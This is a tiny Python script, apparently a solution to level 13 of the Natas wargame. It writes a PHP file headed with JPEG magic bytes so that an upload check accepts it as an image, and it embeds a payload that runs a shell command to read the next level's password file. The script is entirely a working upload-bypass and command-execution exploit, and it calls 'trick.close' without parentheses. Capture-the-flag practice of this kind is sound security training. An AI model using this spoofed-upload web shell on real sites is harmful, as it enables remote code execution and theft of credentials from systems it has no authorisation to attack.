# Tricks programs into believing the PHP code is a JPEG.

trick = open('13owned.php', 'w')

trick.write('\xFF\xD8\xFF\xE0' + '<?php echo exec("cat /etc/natas_webpass/natas14"); ?>')

trick.close

